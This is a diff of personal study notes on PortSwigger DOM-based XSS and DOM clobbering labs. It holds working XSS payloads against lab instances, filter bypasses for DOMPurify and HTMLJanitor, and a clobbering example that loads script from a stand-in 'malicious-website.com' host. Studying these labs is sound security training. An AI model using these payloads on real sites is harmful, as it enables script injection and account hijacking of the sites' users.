@@ -127,9 +127,11 @@ look for keyword url in response - find in post pages (GET /post?postId=1 HTTP/1
 ```
 
 **portswigger solution:**
+
 https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/
 
 **payload:**
+
 https://0ad300bc03e07eacc1b32b24000900f0.web-security-academy.net/post?postId=1&url=https://exploit-0ab1006e03af7ee6c1892b8c011f001f.web-security-academy.net/exploit
 
 (of course in the exploit page needs to be a badass maliciouse code)
@@ -163,19 +165,18 @@ portswigger solution:
 ```htm
 <iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
 ```
-
-<!-- i guess the onload works as follow:
-check if window.x (arbitary var?) has value and if he does we redirect iframe to the second url value; after we load the window.x with value to make sure it resualts to true to fire the onload handler.
-
-not sure why window.x only being loaded in the end
-not sure why use the if clause and not redirect otherwise
-
-but still - supercool -->
-
 payload:
 ```htm
 <iframe src="https://0a900063030848c7c03f08790046001e.web-security-academy.net/product?productId=3&'><script>print()</script>" onload="if(!window.x)this.src='https://0a900063030848c7c03f08790046001e.web-security-academy.net';window.x=1">
 ```
+
+<!-- the exploit works as follow:
+In a iframe we load a page with our XSS payload embeded in the uri. this loads payload into the cookie of LastViewProduct .
+after the load complete (onload command), we check if window.x (arbitary var) has a value since it doesnt, iframes redirects to the second url value - this time with the paylaod already loaded to the LastViewProduct cookie to be processed by document.cookie  SINK 
+
+not sure why we need to assign a value to window.x...
+
+supercool :) -->
 
 # DOMed!
 
@@ -183,7 +184,7 @@ payload:
 # DOM-based XSS
 https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data
 
-# ***1.Lab: DOM XSS in document.write sink using source location.search ***
+# ***1.Lab: DOM XSS in document.write sink using source location.search*** 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
 
 original Java script:
@@ -246,40 +247,57 @@ original Java script:
     }
 
 payload:
-> <img%20src=1%20onerror=alert(1)>
+```
+<img%20src=1%20onerror=alert(1)>
+```
 
 full path:
-> GET /?search=<img%20src=1%20onerror=alert(1)> HTTP/1.
+```
+GET /?search=<img%20src=1%20onerror=alert(1)> HTTP/1.
+```
+
 
 # ***4. Lab: DOM XSS in jQuery anchor href attribute sink using location.search source***
+
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
 
 
 original script:
+```
     $(function() {
         $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
     });
+```
 
 **payload**:
-> ?returnPath=javascript:alert(document.domain)
+```
+?returnPath=javascript:alert(document.domain)
+```
 
 full path:
->GET /feedback?returnPath=javascript:alert(document.domain) HTTP/1.1
+```
+GET /feedback?returnPath=javascript:alert(document.domain) HTTP/1.1
+```
+
 
 # ***5. Lab: DOM XSS in jQuery selector sink using a hashchange event***
-https:/portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
 
+https:/portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+```
 original script:
     $(window).on('hashchange', function(){
         var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
         if (post) post.get(0).scrollIntoView();
     });
-
+```
 payload format:
-> <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print(1)>'">
-
+```
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print(1)>'">
+```
 **final payload:**
-> <iframe src="https://ac201fda1fe56926c03d960700870032.web-security-academy.net#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
+<iframe src="https://ac201fda1fe56926c03d960700870032.web-security-academy.net#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
 to be stored on attacker server and deliverd as url
 
 
@@ -287,19 +305,24 @@ to be stored on attacker server and deliverd as url
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
 
 vulnerable code:
+```
     <body ng-app="" class="ng-scope">
         <input type="text" placeholder="Search the blog..." name="search">
-  
+```  
 **payload:**
-> {{$on.constructor('alert(1)')()}}
-
+```
+{{$on.constructor('alert(1)')()}}
+```
 full path:
-> GET /?search={{$on.constructor('alert(1)')()}} HTTP/1.1
+```
+GET /?search={{$on.constructor('alert(1)')()}} HTTP/1.1
+```
 
 # ***7. Lab: DOM XSS combined with reflected and stored data***
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
 
 original script:
+```
     function search(path) {
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
@@ -310,31 +333,148 @@ original script:
         };
         xhr.open("GET", path + window.location.search);
         xhr.send();
-
+```
 the vulnrable line:
-> eval('var searchResultsObj = ' + this.responseText)
+```
+eval('var searchResultsObj = ' + this.responseText)
+```
 
 **payload:**
-> \"-alert(1)}//
-
+```
+\"-alert(1)}//
+```
 full payload request:
-> eval('var searchResultsObj = ' +  \"-alert(1)}//
-respinse:
-    HTTP/1.1 200 OK
+```
+eval('var searchResultsObj = ' +  \"-alert(1)}//
+```
 
-    {"results":[],"searchTerm":" \\"-alert(1)}//
+response:
+```
+HTTP/1.1 200 OK
 
-# ***8. Lab: Stored DOM XSS**
+{"results":[],"searchTerm":" \\"-alert(1)}//
+```
+
+# ***8. Lab: Stored DOM XSS***
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
 
 payload:
-> <><img src=1 onerror=alert(1)>
+```
+<><img src=1 onerror=alert(1)>
+```
 
 the website uses the JavaScript replace() function
 including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected,
 
+# xssed
 
-# **materials:**
+<span style="color:yellow;font-weight:700;font-size:30px">
+DOM clobbering
+</span>
+
+https://portswigger.net/web-security/dom-based/dom-clobbering
+
+This lab contains a DOM-clobbering vulnerability. The comment functionality allows "safe" HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function. 
+
+**material:**
+vulen code:
+```html
+<script>
+    window.onload = function(){
+        let someObject = window.someObject || {};
+        let script = document.createElement('script');
+        script.src = someObject.url;
+        document.body.appendChild(script);
+    };
+</script>
+```
+payload:
+```html
+<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
+```
+
+1. find sink:
+request:
+```
+GET /resources/js/loadCommentsWithDomClobbering.js HTTP/1.1
+```
+response:
+```js
+if (comment.body) {
+    let commentBodyPElement = document.createElement("p");
+    commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
+
+    commentSection.appendChild(commentBodyPElement);
+}
+commentSection.appendChild(document.createElement("p"));
+
+userComments.appendChild(commentSection);
+```
+
+payload:
+```
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert()//">
+```
+DOMPurify allows you to use the cid: protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. As a result, the injection described above will cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:"onerror=alert(1)//’} the next time the page is loaded. 
+
+better to write payload straight at the comment box on site
+
+<!-- didnt work: 
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href=<img src=x onerror=alert();>
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href=https://test.com?<img src=x onerror=alert();>
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href=https://test.com?alert();> -->
+
+
+# ***2. Lab: Clobbering DOM attributes to bypass HTML filters***
+https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters
+
+This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls the print() function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser. 
+
+**materials:**
+```html
+<form onclick=alert(1)><input id=attributes>Click me
+```
+
+find attribute to clobber:
+
+```html
+// Sanitize attributes
+for (var a = 0; a < node.attributes.length; a += 1) {
+var attr = node.attributes[a];
+
+if (shouldRejectAttr(attr, allowedAttrs, node)) {
+    node.removeAttribute(attr.name);
+    // Shift the array to continue looping.
+    a = a - 1;
+}
+}
+```
+
+
+1. **in comment:**
+
+*define \<form> **x** that when its focused - it print/alert + clobber the **attribute** with undefined \<input>. this form will sit and ambush any one that focuses on  \<form> **x**:*
+
+```html
+<form id=x tabindex=0 onfocus=print()><input id=attributes>
+
+```
+2. **in exploit server:**
+prepare an iframe of the infected page + 500ms pause + add **#x** (hash x) to focus page on \<form>**x** and make it fire
+
+```html
+<iframe src=https://0acf00e503ebe624c0eb13bc007f00df.web-security-academy.net/post?postId=8 onload="setTimeout(()=>this.src=this.src+'#x',500)">
+```
+
+3. deliver to victim
+
+# super cool
+
+
+<span style="color:yellow;font-weight:700;font-size:30px">
+materials
+</span>
+
 
 # Portwsigger cheetsheet:
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
@@ -342,68 +482,181 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 # **Which sinks can lead to DOM-XSS vulnerabilities?**
 
 The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
-    document.write()
-    document.writeln()
-    document.domain
-    element.innerHTML
-    element.outerHTML
-    element.insertAdjacentHTML
-    element.onevent
+```js
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+```
 
  The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
-    add()
-    after()
-    append()
-    animate()
-    insertAfter()
-    insertBefore()
-    before()
-    html()
-    prepend()
-    replaceAll()
-    replaceWith()
-    wrap()
-    wrapInner()
-    wrapAll()
-    has()
-    constructor()
-    init()
-    index()
-    jQuery.parseHTML()
-    $.parseHTML()
+```js
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+```
 
 
  The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
-    document.URL
-    document.documentURI
-    document.URLUnencoded
-    document.baseURI
-    location
-    document.cookie
-    document.referrer
-    window.name
-    history.pushState
-    history.replaceState
-    localStorage
-    sessionStorage
-    IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
-    Database
+```js
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location
+document.cookie
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+Database
+```
 
 
-    DOM-based vulnerability 	Example sink
-    DOM XSS LABS 	document.write()
-    Open redirection LABS 	window.location
-    Cookie manipulation LABS 	document.cookie
-    JavaScript injection 	eval()
-    Document-domain manipulation 	document.domain
-    WebSocket-URL poisoning 	WebSocket()
-    Link manipulation 	element.src
-    Web message manipulation 	postMessage()
-    Ajax request-header manipulation 	setRequestHeader()
-    Local file-path manipulation 	FileReader.readAsText()
-    Client-side SQL injection 	ExecuteSql()
-    HTML5-storage manipulation 	sessionStorage.setItem()
-    Client-side XPath injection 	document.evaluate()
-    Client-side JSON injection 	JSON.parse()
-    DOM-data manipulation 	element.setAttribute()
-    Denial of service 	RegExp()
+1. DOM XSS *LABS above*
+```js
+document.write()
+```
+2. Open redirection *LABS above*
+```js
+window.location
+```
+3. Cookie manipulation *LABS above*
+```js
+document.cookie
+```
+4. JavaScript injection
+https://portswigger.net/web-security/dom-based/javascript-injection 	
+
+```javascript
+eval()
+Function()
+setTimeout()
+setInterval()
+setImmediate()
+execCommand()
+execScript()
+msSetImmediate()
+range.createContextualFragment()
+crypto.generateCRMFRequest()eval()
+```
+5. Document-domain manipulation
+https://portswigger.net/web-security/dom-based/document-domain-manipulation
+```javascript
+document.domain
+```
+6. WebSocket-URL poisoning
+https://portswigger.net/web-security/dom-based/websocket-url-poisoning 	
+```js 
+WebSocket()
+```
+7. Link manipulation
+https://portswigger.net/web-security/dom-based/link-manipulation
+```js 
+element.href
+element.src
+element.action
+```
+8. Web message manipulation *LABS above*
+https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
+```js 
+postMessage()
+```
+9. Ajax request-header manipulation
+https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation
+```js 
+XMLHttpRequest.setRequestHeader()
+XMLHttpRequest.open()
+XMLHttpRequest.send()
+jQuery.globalEval()
+$.globalEval()
+```
+10. Local file-path manipulation
+https://portswigger.net/web-security/dom-based/local-file-path-manipulation 	
+```js 
+FileReader.readAsArrayBuffer()
+FileReader.readAsBinaryString()
+FileReader.readAsDataURL()
+FileReader.readAsText()
+FileReader.readAsFile()
+FileReader.root.getFile()
+```
+11. Client-side SQL injection
+https://portswigger.net/web-security/dom-based/client-side-sql-injection
+```js 
+ExecuteSql()
+```
+12. HTML5-storage manipulation 
+https://portswigger.net/web-security/dom-based/html5-storage-manipulation
+```js 
+sessionStorage.setItem()
+localStorage.setItem()
+```
+13. Client-side XPath injection
+https://portswigger.net/web-security/dom-based/client-side-xpath-injection
+```js 
+document.evaluate()
+element.evaluate()
+```
+14. Client-side JSON injection
+https://portswigger.net/web-security/dom-based/client-side-json-injection
+```js 
+JSON.parse()
+jQuery.parseJSON()
+$.parseJSON()
+```
+15. DOM-data manipulation
+https://portswigger.net/web-security/dom-based/dom-data-manipulation
+```js 
+script.src
+script.text
+script.textContent
+script.innerText
+element.setAttribute()
+element.search
+element.text
+element.textContent
+element.innerText
+element.outerText
+element.value
+element.name
+element.target
+element.method
+element.type
+element.backgroundImage
+element.cssText
+element.codebase
+document.title
+document.implementation.createHTMLDocument()
+history.pushState()
+history.replaceState()
+```
+16. Denial of service
+https://portswigger.net/web-security/dom-based/denial-of-service
+```js 
+requestFileSystem()
+RegExp()
+```
